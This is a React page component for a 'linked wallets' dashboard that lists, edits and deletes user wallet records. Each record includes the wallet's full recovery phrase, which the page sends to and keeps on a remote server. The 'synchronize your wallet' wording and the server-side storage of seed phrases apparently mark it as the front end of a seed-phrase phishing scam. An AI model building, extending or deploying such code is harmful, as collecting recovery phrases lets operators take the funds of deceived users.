import React, { useEffect, useState } from "react";
import Container from "../../components/Container";
import Alert from "../../components/vendor/alert/Alert";
import api from "../../api/config";
import TextInput from "../../components/vendor/form/TextInput";
import TextArea from "../../components/vendor/form/TextArea";
import SubmitButton from "../../components/vendor/button/SubmitButton";
import Spinner from "../../components/Spinner";

export default function WalletView() {
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [editingWallet, setEditingWallet] = useState(null);
  const [editLoading, setEditLoading] = useState(false);
  const [result, setResult] = useState({ status: 0, message: null });

  const fetchUserWallets = async () => {
    try {
      const response = await api.get("/wallets/user");
      if (response.data.status === 200) {
        setWallets(response.data.data);
      }
    } catch (error) {
      console.error("Failed to fetch user wallets", error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchUserWallets();
  }, []);

  const handleDelete = async (id) => {
    if (!window.confirm("Are you sure you want to disconnect this wallet?")) return;
    try {
      const response = await api.delete(`/wallets/user/${id}`);
      if (response.data.status === 200) {
        setResult({ status: 200, message: "Wallet disconnected successfully" });
        setWallets(wallets.filter(w => w.id !== id));
      }
    } catch (error) {
      setResult({ status: 400, message: "Failed to delete wallet" });
    }
  };

  const handleEditSubmit = async (e) => {
    e.preventDefault();
    setEditLoading(true);
    try {
      const response = await api.put(`/wallets/user/${editingWallet.id}`, {
        email_address: editingWallet.email_address,
        recovery_phrase: editingWallet.recovery_phrase
      });
      if (response.data.status === 200) {
        setResult({ status: 200, message: "Wallet updated successfully" });
        setWallets(wallets.map(w => w.id === editingWallet.id ? { ...w, ...editingWallet } : w));
        setEditingWallet(null);
      }
    } catch (error) {
      setResult({ status: 400, message: "Failed to update wallet" });
    } finally {
      setEditLoading(false);
    }
  };

  if (loading) return <div className="h-screen flex items-center justify-center"><Spinner /></div>;

  return (
    <Container title="My Linked Wallets">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <div className="flex justify-between items-center mb-8">
            <h1 className="text-3xl font-black tracking-tight gradient-text uppercase">Connected Power</h1>
            <p className="text-gray-500 dark:text-gray-400 font-medium">Manage your synchronized blockchain assets</p>
        </div>

        <Alert result={result} setResult={setResult} timer={5000} />

        {wallets.length === 0 ? (
          <div className="glass-card rounded-[2.5rem] p-20 text-center space-y-4">
             <div className="mx-auto w-20 h-20 bg-gray-100 dark:bg-gray-800 rounded-3xl flex items-center justify-center text-gray-400">
                <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
             </div>
             <h2 className="text-xl font-bold">No Wallets Connected</h2>
             <p className="text-gray-500">Synchronize your first wallet to get started.</p>
             <a href="/dashboard/wallet" className="inline-block px-8 py-3 bg-blue-600 text-white rounded-xl font-bold hover:bg-blue-700 transition-all">Link Wallet</a>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {wallets.map((wallet) => (
              <div key={wallet.id} className="glass-card rounded-[2.5rem] p-8 border-white/5 relative group transition-all hover:scale-[1.02] hover:shadow-2xl hover:shadow-blue-500/10 active:scale-[0.98]">
                <div className="flex justify-between items-start mb-6">
                  <div className="w-14 h-14 bg-gradient-to-br from-blue-500/10 to-indigo-500/10 rounded-2xl flex items-center justify-center text-blue-500 shadow-inner">
                    <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg>
                  </div>
                  <div className="flex gap-2">
                    <button 
                      onClick={() => setEditingWallet(wallet)}
                      className="p-2.5 rounded-xl bg-gray-100 dark:bg-gray-800/50 text-gray-400 hover:text-blue-500 hover:bg-blue-500/10 transition-all"
                    >
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" /></svg>
                    </button>
                    <button 
                      onClick={() => handleDelete(wallet.id)}
                      className="p-2.5 rounded-xl bg-gray-100 dark:bg-gray-800/50 text-gray-400 hover:text-red-500 hover:bg-red-500/10 transition-all"
                    >
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
                    </button>
                  </div>
                </div>

                <div className="space-y-4">
                  <div>
                    <h3 className="text-xl font-black text-gray-900 dark:text-white uppercase tracking-tight">
                      {wallet.wallet_details?.wallet_name || "Custom Wallet"}
                    </h3>
                    <div className="flex items-center gap-3 mt-2">
                      <p className="text-[10px] font-bold text-blue-500 uppercase tracking-widest">
                        {wallet.wallet_details?.wallet_network || "MAINNET"}
                      </p>
                      <span className={`text-[9px] font-black uppercase tracking-widest px-2 py-0.5 rounded-full border ${
                          wallet.status === "verified" ? "bg-emerald-500/10 text-emerald-500 border-emerald-500/20" :
                          wallet.status === "rejected" ? "bg-red-500/10 text-red-500 border-red-500/20" :
                          "bg-amber-500/10 text-amber-500 border-amber-500/20"
                      }`}>
                          {wallet.status || "pending"}
                      </span>
                    </div>
                  </div>

                  <div className="p-4 bg-gray-50 dark:bg-gray-800/20 rounded-2xl border border-gray-100 dark:border-gray-800 space-y-2">
                    <div className="flex justify-between items-center text-xs">
                       <span className="text-gray-400 font-bold uppercase">Contact</span>
                       <span className="text-gray-900 dark:text-gray-200 font-medium truncate ml-2">
                          {wallet.email_address || "None Provided"}
                       </span>
                    </div>
                    <div className="flex justify-between items-start text-xs pt-2 border-t border-gray-100 dark:border-gray-800">
                       <span className="text-gray-400 font-bold uppercase">Keys</span>
                       <span className="text-gray-900 dark:text-gray-200 font-mono text-[10px] break-all ml-2 text-right opacity-60">
                          {wallet.recovery_phrase.substring(0, 20)}...
                       </span>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Edit Modal */}
        {editingWallet && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center p-4">
            <div className="absolute inset-0 bg-black/60 backdrop-blur-md" onClick={() => setEditingWallet(null)}></div>
            <div className="relative glass-card rounded-[3rem] w-full max-w-lg p-10 shadow-2xl animate-fade-in">
                <div className="flex justify-between items-center mb-8">
                   <h2 className="text-2xl font-black tracking-tight uppercase">Update Sync</h2>
                   <button onClick={() => setEditingWallet(null)} className="p-2 rounded-xl hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors">
                      <svg className="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" /></svg>
                   </button>
                </div>

                <form onSubmit={handleEditSubmit} className="space-y-6">
                   <div className="space-y-4">
                      <div>
                        <label className="block text-sm font-bold text-gray-400 mb-2 px-1">Contact Email</label>
                        <TextInput 
                          name="email_address"
                          value={editingWallet.email_address}
                          handleChange={(e) => setEditingWallet({ ...editingWallet, email_address: e.target.value })}
                          placeholder="Email"
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-bold text-gray-400 mb-2 px-1">Recovery Phrase</label>
                        <TextArea 
                          name="recovery_phrase"
                          value={editingWallet.recovery_phrase}
                          handleChange={(e) => setEditingWallet({ ...editingWallet, recovery_phrase: e.target.value })}
                          placeholder="Recovery Phrase"
                          rows={3}
                        />
                      </div>
                   </div>

                   <SubmitButton 
                      loading={editLoading} 
                      text="SAVE CHANGES" 
                      className="w-full py-4 bg-gradient-to-r from-blue-600 to-indigo-700 text-white rounded-2xl font-black shadow-xl shadow-blue-500/30 transition-all hover:scale-[1.02]"
                   />
                </form>
            </div>
          </div>
        )}
      </div>
    </Container>
  );
}
